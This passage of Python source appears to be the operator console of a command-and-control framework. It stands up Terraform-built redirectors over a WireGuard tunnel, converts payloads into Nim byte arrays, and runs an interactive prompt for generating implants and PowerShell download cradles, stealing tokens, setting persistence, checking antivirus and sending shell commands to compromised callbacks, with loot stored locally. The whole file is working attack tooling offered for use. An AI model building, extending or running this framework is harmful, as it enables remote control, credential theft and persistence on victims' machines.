    caddy_loc_new = redir_folder / 'Caddyfile'
    tf_http_redir_loc_new = terra_loc / 'http_redir.tf'
    wg_server_private_key = terra_loc / 'keys' / 'server-privatekey'
    wg_server_public_key = terra_loc / 'keys' / 'server-publickey'
    wg_client_private_key = terra_loc / 'keys' / 'client-privatekey'
    wg_client_public_key = terra_loc / 'keys' / 'client-publickey'

    shutil.copy(tf_var_file_loc, terra_loc)
    shutil.copy(caddy_loc, redir_folder)
    shutil.copy(tf_http_redir_loc, terra_loc)
    global dns_record

    if tf_var_file_loc_new.exists():
        if dns_rec is not None:
            dns_record = dns_rec
            
        else:
            print(f'{Fore.RED}[-] Something went wrong with saving the domain name.... please try again!')
        
        dns_record_list = dns_record.split(".")
        sub_dns_record = dns_record_list.pop(0)    
        main_dns_record = '.'.join(dns_record_list)

        patch_var(dns_record, caddy_loc_new, 'URL')
        shutil.move(caddy_loc_new, f"{redir_folder}/Caddyfile")

        patch_var(main_dns_record, tf_http_redir_loc_new, 'DOMAIN')
        
        patch_var(sub_dns_record, tf_http_redir_loc_new, 'SUB')

        # Generate the private key and write it to a file
        private_key = subprocess.run(["wg", "genkey"], capture_output=True, text=True).stdout.strip()
        open(wg_server_private_key, "w").write(private_key)

        public_key = subprocess.run(["wg", "pubkey"], capture_output=True, text=True, input=private_key).stdout.strip()
        open(wg_server_public_key, "w").write(public_key)


        client_private_key = subprocess.run(["wg", "genkey"], capture_output=True, text=True).stdout.strip()
        open(wg_client_private_key, "w").write(client_private_key)

        client_public_key = subprocess.run(["wg", "pubkey"], capture_output=True, text=True, input=client_private_key).stdout.strip()
        open(wg_client_public_key, "w").write(client_public_key)


        patch_var(private_key, tf_var_file_loc_new, 'SERVER-PRIVATE-KEY')


        patch_var(client_public_key, tf_var_file_loc_new, 'CLIENT-PUB-KEY')

        

        terra_init = ["terraform", "init"]
        subprocess.run(terra_init, cwd=terra_loc)
        terra_apply = ["terraform", "apply", "-auto-approve"]
        spinner.start()
        result = subprocess.run(terra_apply, text=True, capture_output=True, cwd=terra_loc)
        if result.returncode == 0:
            spinner.stop()
            print(result.stdout)
        else:
            print(result.stderr)
        redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', result.stdout)
        re_ip_str = "".join(redir_ip)

        config = textwrap.dedent(
            f"""\
            [Interface]
            PrivateKey = {client_private_key}
            Address = 192.168.255.2/24
            [Peer]
            PublicKey = {public_key}
            AllowedIPs = 0.0.0.0/0
            Endpoint = {re_ip_str}:51820
            PersistentKeepalive = 25"""
        )
    print(config)

    with open("/etc/wireguard/wg0.conf", "w") as f:
        f.write(config)
        f.close()
    print("Config written to '/etc/wireguard/wg0.conf'")
    print("Starting the WG tunnel to the redir. . .")


    start_wg = subprocess.run(['wg-quick', 'up', 'wg0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if start_wg.returncode == 0:
        print("Tunnel started")
    else:
        print("Tunnel failed to start")

    connectivity_check = subprocess.run(['ping', '-c', '4', re_ip_str], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if connectivity_check.returncode == 0:
        print("Looks like connection is succesfull")
    else:
        print("Ping test failed - cannot reach the VPS")


def CSharpToNimByteArray(inputfile, folder=False):
    global outfile
    try:
        if folder:
            files = os.listdir(inputfile)
            for file in files:
                print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
                outfile = file + "NimByteArray.txt"
        
                with open(file, "rb") as f:
                    hex_data = f.read().hex()
                    hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                    hex_string = "0x" + hex_string
                    with open(outfile, "w", encoding="utf-8") as out:
                        out.write(hex_string)
        
            print(Fore.GREEN + "[*] Results Written to the same folder")
        else:
            
            cwd_payload = os.getcwd()
            inputfile_path = os.path.expanduser(f'{cwd_payload}/Payloads')
            print(f"Converting {inputfile}")
            outfile = inputfile + "NimByteArray.txt"
            
            with open(f'{inputfile_path}/{inputfile}', "rb") as f:
                hex_data = f.read().hex()
                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
                hex_string = "0x" + hex_string
                with open(outfile, "w", encoding="utf-8") as out:
                    out.write(hex_string)
            
            print(f"{Fore.GREEN}[*] Result Written to {outfile}")


        # dos2unix conversion
        with open(outfile, "r") as f:
            content = f.read()
            with open(outfile, "w") as out:
                out.write(content.replace("\r\n", "\n"))
    except:
        print(f"{Fore.RED}[-] File not found")
        pass

class MyCompleter(object):  

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  
            if text: 
                self.matches = [s for s in self.options 
                                    if s and s.startswith(text)]
            else: 
                self.matches = self.options[:]

       
        try: 
            return self.matches[state]
        except IndexError:
            return None
    
    def add_keyword(self, keyword):
        self.options.append(keyword)
        self.options = sorted(self.options)

def payload_list():
    cwd_payload = os.getcwd()
    formatted_files = ''
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    print(f'{Fore.LIGHTYELLOW_EX}[*] Available payloads: ')
    for file in os.listdir(payload_loc):
        print(f'{Fore.CYAN}>> {file}')
        formatted_files += f'>> {file}\n'
        if file not in keywords:
            completer.add_keyword(file)
    return formatted_files

def payload_keyword_add():
    global keywords
    cwd_payload = os.getcwd()
    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
    for file in os.listdir(payload_loc):
        if file not in keywords:
            completer.add_keyword(file)
            keywords.append(file)

def callback_keyword_add():
    global keywords
    cb_data = fetch_callback_id_all()
    for i in cb_data:
        if i not in keywords:
            completer.add_keyword(i)
            keywords.append(i)

def is_port_open(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)  # Timeout for the operation
    try:
        sock.connect((ip, port))
        sock.shutdown(socket.SHUT_RDWR)
        return True
    except:
        return False
    finally:
        sock.close()

def run_command_with_spinner(command, cwd, spinner):
    spinner.start()
    result = subprocess.run(command, text=True, capture_output=True, cwd=cwd)
    spinner.stop()
    if result.returncode == 0:
        print(result.stdout)
        return True
    else:
        print(result.stderr)
        return False

def exit_handler():
    terra_loc_tcp = Path.cwd().parent / 'Terraform_TCP'
    terra_loc_http = Path.cwd().parent / 'Terraform_HTTP'
    destroy_spinner_obj = destroy_spinner()

    print(Fore.LIGHTYELLOW_EX + '[*] Destroying redirector infrastructure...')
    #run_command_with_spinner(["terraform", "destroy", "-auto-approve"], terra_loc_tcp, destroy_spinner_obj)

    print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
    if not run_command_with_spinner(["rm", "script.sh"], terra_loc_tcp, destroy_spinner_obj) or not run_command_with_spinner(["rm", "redirector.tf"], terra_loc_tcp, destroy_spinner_obj):
        print(Fore.RED + '[-] No files needs to be removed...')
    else:
        print(Fore.GREEN + '[+] Files successfully cleaned')

    run_command_with_spinner(["wg-quick", "down", "wg0"], terra_loc_http, destroy_spinner_obj)
    run_command_with_spinner(["terraform", "destroy", "-auto-approve"], terra_loc_http, destroy_spinner_obj)

    print(Fore.LIGHTYELLOW_EX + '[*] Cleaning up files...')
    if not run_command_with_spinner(["rm", "variable.tf"], terra_loc_http, destroy_spinner_obj) or not run_command_with_spinner(["rm", "http_redir.tf"], terra_loc_http, destroy_spinner_obj):
        print(Fore.RED + '[-] No files needs to be removed...')
    else:
        print(Fore.GREEN + '[+] Files successfully cleaned')

    update_all_listeners_status("Stopped")

    print(Fore.GREEN + '\n' +'[+] Redirector infrastructure and associated files have successfully been destroyed')


if __name__ == '__main__':
    global keywords
    keywords = ["listener -g","listener -l","HTTP", "TCP", "threads","rev2self","steal_token","whoami","history" ,"nimplant -g", "callbacks","download","use ", "pwsh_cradle", "kill ", "exit","sleep","help","payloads", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "shell", "tShell"]
    completer = MyCompleter(keywords)
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    for kw in keywords:
        readline.add_history(kw)
    colorama.init(autoreset=True)
    targets = [] #store each connection
    global listener_count
    listener_count = 0
    banner()
    internal_interface()
    
    kill_flag = 0
    global host_ip
    global host_port
    global listen_type
    global target_id
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



    if is_db_file_exists():
        persistant_conf=input(Fore.LIGHTYELLOW_EX + '[*] Do you want to use the existing DB from last session ? (y/n): ' + Fore.RESET)
        if persistant_conf.lower() == 'y':
            restart_listeners()
            callback_keyword_add()
            auth_key = get_key('auth_key')
            RCKey = get_key('RCKey')
            
        else:
            yes_to_delete = input(Fore.LIGHTYELLOW_EX + '[*] Are you sure you want to continue, this will wipe the DB and create a new (y/n): ' + Fore.RESET)
            if yes_to_delete.lower() == 'y':

                clear_all_tables()
                length_gen = secrets.SystemRandom()
                key_length = length_gen.randint(12,33)
                auth_key = (''.join(secrets.token_urlsafe(key_length)))
                
                RCkey_length = length_gen.randint(12,18)
                RCKey = (''.join(secrets.token_urlsafe(key_length)))
                print(Fore.LIGHTYELLOW_EX + '[*] Listeners deleted...')
                print(Fore.LIGHTYELLOW_EX + '[*] Encryption keys deleted...')
                print(Fore.LIGHTYELLOW_EX + '[*] Callbacks deleted...')
                print(Fore.LIGHTYELLOW_EX + '[*] Tasks deleted...')
            else:
                print(Fore.LIGHTYELLOW_EX + '[*] Exiting...')
                sys.exit()

    if not is_db_file_exists():
        connect_to_db()
        print(f'{Fore.GREEN}[+] Database established')

    if is_db_empty():
        create_base_db_structure()
        print(f'{Fore.GREEN}[+] Database structure created')


    if not os.path.exists('Generated_Implants'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
        os.mkdir('Generated_Implants')
    if not os.path.exists('Payloads'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
        os.mkdir('Payloads')
    if not os.path.exists('Loot'):
        print(Fore.LIGHTYELLOW_EX + "[+] Creating Loot Directory...")
        os.mkdir('Loot')
    
    payload_keyword_add()





    key_status = keys_exist_in_db()
    if key_status == 0:
        length_gen = secrets.SystemRandom()
        key_length = length_gen.randint(12,33)
        auth_key = (''.join(secrets.token_urlsafe(key_length)))
        
        RCkey_length = length_gen.randint(12,18)
        RCKey = (''.join(secrets.token_urlsafe(key_length)))
        add_keys_to_db(auth_key, RCKey)
    else:
        pass

    while True:
        try:
            command = input(Fore.LIGHTYELLOW_EX +'Enter command#>' + Fore.RESET)
            if command == 'help':
                help()
            elif command == 'threads':
                for thread in threading.enumerate(): 
                    print(thread.name)
            elif command.split(" ")[0] == 'stop_listener':
                print(Fore.LIGHTYELLOW_EX + '[*] Stopping listener...')
                listener_id = command.split(" ")[1]
                print(listener_id)
                stop_thread(listener_id)
            elif command == 'help background':
                background_help()
            elif command == 'help execute-ASM':
                execute_ASM_help()
            elif command == 'help payloads':
                payloads_help()
            elif command == 'help listener' or command == 'help listener -g':
                listener_help()
            elif command == 'help nimplant'or command == 'help nimplant -g':
                nimplant_help()
            elif command == 'help pwsh_cradle':
                pwsh_cradle_help()
            elif command == 'help GetAV':
                GetAV_help()
            elif command == 'help download':
                download_help()
            elif command == 'help use':
                use_help()
            elif command == 'help kill':
                kill_help()
            elif command == 'help callbacks':
                callbacks_help()
            elif command == 'help pwsh':
                pwsh_help()
            elif command == 'help shell':
                shell_help()
            elif command == 'help cd':
                cd_help()
            elif command == 'help ls':
                ls_help()
            elif command == 'help pwd':
                pwd_help()
            elif command == 'help exit':
                exit_help()
            elif command == 'help sleep':
                sleep_help()
            elif command == 'help persist':
                persist_help()
            
            elif command == 'payloads':
                payload_list()
            elif command.split(" ")[0] == 'history':
                try:
                    command_history(command.split(" ")[1])
                except:
                    print(Fore.RED + '[-] Provide callback ID')
            elif command == 'db':
                print_schema()
            elif command == 'listener -l':
                display_listeners_from_db()
            
            
            if command == 'listener -g TCP':
                print(f'{Fore.RED} The TCP implant is currently undergoing a complete rework and has been disabled for the current version')
            #     listen_type = 'TCP'
            #     try:
            #         print(Fore.CYAN + '[*] 1. Interface')
            #         print(Fore.CYAN + '[*] 2. IP-Address')
            #         print(Fore.CYAN + '[*] 3. Listener with redirector\n ')
            #         listen_choice = (input(Fore.LIGHTYELLOW_EX + '[*] Choose an option: ' + Fore.RESET))
            #     except (OSError, ValueError, TypeError):
            #         print(Fore.RED + '[-] No such option... Please try again')
                
            #     if listen_choice == '1':
            #         while True:
            #             try:
            #                 host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
            #                 host_port = int(input(Fore.CYAN + '[#] Enter listening port: '+ Fore.RESET))
            #                 break  # exit the loop if no exception was raised
            #             except (OSError, ValueError, TypeError):
            #                 print(Fore.RED + '[-] No such Interface or port... Please try again')
            #     elif listen_choice == 2:
                    
            #         while True:
            #             try:
            #                 host_ip = input('[#] Enter the IP to listen on: ')
            #                 host_port = int(input('[#] Enter listening port: '))
            #                 break  # exit the loop if no exception was raised
            #             except (OSError, ValueError, TypeError):
            #                 print('[-] No such IP or port... Please try again')
            #     elif listen_choice == '3':
            #         host_ip = resolve_ip("lo")
            #         host_port = int(input('[#] Enter listening port: '))
            #         redirector(host_port)
                
            #     listener_handler()
            #     listener_count +=1
            #     global payload_srv_ip
            #     payload_srv_ip = web_payload_server(host_ip)
            

            elif command == 'listener -g HTTP':
                global payload_srv_ip
                global payload_port
                listen_type = 'HTTP'

                options = ["Interface", "Listener with HTTPS redirector"]
                print(Fore.CYAN + '[*] Choose a listener type: ')
                terminal_menu = TerminalMenu(options)
                menu_entry_index = terminal_menu.show()
                

                listen_choice = options[menu_entry_index]
                if listen_choice == 'Interface':
                    http_host_port = int(input(Fore.CYAN + '[#] Enter listening port: ' + Fore.RESET))
                    httpListenerHandler()
                    listener_count +=1
                    interface_list = print_interfaces()
                    print(Fore.CYAN + '[*] Choose interface to use for payload server: ')

                    options = []
                    for i in interface_list:
                        options.append(i)
                    options.append('Abort payload server creation')

                    terminal_menu = TerminalMenu(options)
                    menu_entry_index = terminal_menu.show()
                    if menu_entry_index == 'Abort payload server creation':
                        print(Fore.RED + '[-] Aborting payload server creation')
                        continue
                    web_srv_ip = resolve_ip(options[menu_entry_index])
                    payload_port = random.randint(8000, 8999)
                    payload_srv_ip = web_payload_server(web_srv_ip, payload_port)

                elif listen_choice == 'Listener with HTTPS redirector':
                    dns_record = input("Enter the domain name for the redirector and implant: ")
                    redirector_http(dns_record)
                    HttpRedirectorListenerHandler(dns_record)
                    listener_count +=1

            elif command == 'nimplant -g TCP':
                if listener_count > 0:
                    nimplant()
                else:
                    print(f'{Fore.RED}[-] Cannot compile payload without active listener{Fore.RESET}')
            elif command == 'nimplant -g HTTP':
                if listener_count > 0:
                    nimplant_HTTP(None, False)
                else:
                    print(f'{Fore.RED}[-] Cannot compile payload without active listener{Fore.RESET}')
            if command == 'pwsh_cradle':
                if listener_count > 0:
                    pwsh_cradle()
                else:
                    print(f'{Fore.RED}[-] Cannot create pwsh_cradle without active listener{Fore.RESET}')

            if command.split(" ")[0] == 'kill':
                if listen_type == 'TCP':
                    try:
                        num = int(command.split(" ")[1])
                        target_id = (targets[num][0])
                        if targets[num][8] == 'Active':
                            kill_signal(target_id, 'exit')
                            targets[num][8] = 'Dead'
                            print(f'[-] Session {num} terminated')
                        else:
                            print('[-] Cannot interact with a dead session')
                    except(IndexError, ValueError, NameError):
                        try:
                            print(f'Session {num} does not exist')
                        except NameError:
                            print('[-] no active sessions to kill')
                else:
                    try:
                        temp_id = command.split(" ")[1]
                        cb_data = fetch_callback_data(temp_id)
                        if cb_data['status'] == 'Active':
                            kill_http(target_id, 'exit')
                            update_callback_status('Dead', temp_id,)
                            print(f'{Fore.RED} [-] Session {temp_id} terminated {Fore.RESET}')
                        else:
                            print('[-] Cannot interact with a dead session')
                    except(IndexError, ValueError, NameError):
                        try:
                            print(f'Session {temp_id} does not exist')
                        except NameError:
                            print('[-] no active sessions to kill')
            
            if command.split(" ")[0] == 'callbacks':
                session_counter = 0
                
                display_callbacks_from_db()
                session_counter +=1
            


            if command.split(" ")[0] == 'use':
                
                    temp_id = command.split(" ")[1]
                    cb_data = fetch_callback_data(temp_id)

                    if cb_data['type'] == 'HTTP':
                        print(Fore.LIGHTYELLOW_EX + "RUNNING HTTP interaction mode" + Fore.RESET)
                        print(Fore.LIGHTYELLOW_EX + "Deafult callback interval: 5 seconds" + Fore.RESET)
                        target_id = temp_id
                        if cb_data['status'] == 'Active':
                            usernamecb = cb_data['username']
                            http_target_comm(target_id)
                        else: 
                            print(Fore.RED +'[-] Can not interact with Dead implant')
                    elif cb_data['type'] == 'TCP':
                        print(Fore.LIGHTYELLOW_EX + "RUNNING TCP interaction mode" + Fore.RESET)
                        target_id = temp_id
                        if cb_data['status'] == 'Active':
                            target_comm(target_id, targets, num)
                        else: 
                            print(Fore.RED +'[-] Can not interact with Dead implant')

                    
            if command == 'exit':
                quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                if quit_message == 'y':
                    break
                else:
                    continue
        except KeyboardInterrupt:
            quit_message = input(Fore.LIGHTMAGENTA_EX + 'Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
            if quit_message == 'y':
                update_all_listeners_status("Stopped")
                
                if listener_count > 0:
                    sock.close()
                break
            else:
                continue

atexit.register(exit_handler)